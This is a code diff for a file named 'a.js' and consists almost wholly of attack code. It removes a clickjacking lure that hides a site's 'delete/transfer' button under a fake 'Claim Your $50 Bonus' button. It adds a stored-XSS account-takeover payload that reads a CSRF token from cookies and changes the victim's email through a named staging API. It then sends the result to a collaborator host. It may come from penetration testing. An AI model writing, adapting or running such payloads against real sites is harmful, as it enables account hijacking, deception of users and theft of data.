@@ -1,24 +1,54 @@
-<div style="position:relative;z-index:9999;pointer-events:none;width:200px;height:50px;">
-  <!-- The real button is hidden underneath -->
-  <button id="real_danger_btn" style="position:absolute;top:0;left:0;width:200px;height:50px;opacity:0;cursor:pointer;pointer-events:auto;z-index:2;">
-    <!-- This is the real delete/transfer button from the site, but we make it invisible and cover it -->
-  </button>
-  <!-- The fake attractive button sits on top but passes clicks through via pointer-events:none -->
-  <div style="position:absolute;top:0;left:0;width:200px;height:50px;background:green;color:white;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold;z-index:1;pointer-events:none;">
-    🎁 Claim Your $50 Bonus
-  </div>
-</div>
-<script>
-  // Actually target the real button by moving it over the fake one
-  const realBtn = document.querySelector('#real_danger_btn'); // Replace with actual ID/selector
-  if(realBtn) {
-    realBtn.style.position = 'fixed';
-    realBtn.style.top = '200px';
-    realBtn.style.left = '100px';
-    realBtn.style.width = '200px';
-    realBtn.style.height = '50px';
-    realBtn.style.opacity = '0';
-    realBtn.style.zIndex = '99999';
-    realBtn.style.cursor = 'pointer';
-  }
-</script>
+// a.js - Complete Stored XSS Account Takeover Payload
+
+(function() {
+    // 1. CONFIGURATION
+    const TARGET_API = 'https://basilstagingapi.coraltreetech.com/api/user/update';
+    const ATTACKER_SERVER = 'https://sa6gpti0t3wpbikbvuvwuxi0zr5it8hx.oastify.com/log'; // Replace with your VPS/ngrok URL
+
+    // 2. STEAL THE CSRF TOKEN FROM COOKIES
+    function getCookie(name) {
+        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? decodeURIComponent(match[2]) : null;
+    }
+
+    const xsrfToken = getCookie('Secure-XSRF_TOKEN');
+
+    if (!xsrfToken) {
+        // If no CSRF token, send a warning back to yourself
+        navigator.sendBeacon(ATTACKER_SERVER, 'XSRF Token NOT found!');
+        return;
+    }
+
+    // 3. SEND THE MALICIOUS REQUEST (CHANGE EMAIL)
+    fetch(TARGET_API, {
+        method: 'POST',
+        credentials: 'include', // CRITICAL: Sends HttpOnly session_token
+        headers: {
+            'Content-Type': 'application/json',
+            'X-XSRF-TOKEN': xsrfToken,   // Bypass CSRF protection
+            'X-Requested-With': 'XMLHttpRequest' // Sometimes required by backend
+        },
+        body: JSON.stringify({ 
+            email: '
+harshit.j+regular1@cywarden.com' // Change this to your email
+        })
+    })
+    .then(response => {
+        // 4. EXFILTRATE THE RESULT BACK TO YOU
+        return response.text().then(text => {
+            const data = {
+                status: response.status,
+                statusText: response.statusText,
+                body: text,
+                url: window.location.href
+            };
+            // Send the response to your attacker server
+            navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(data));
+        });
+    })
+    .catch(error => {
+        // If the fetch fails (CORS error, network error), log it
+        navigator.sendBeacon(ATTACKER_SERVER, 'Fetch Error: ' + error.message);
+    });
+
+})();
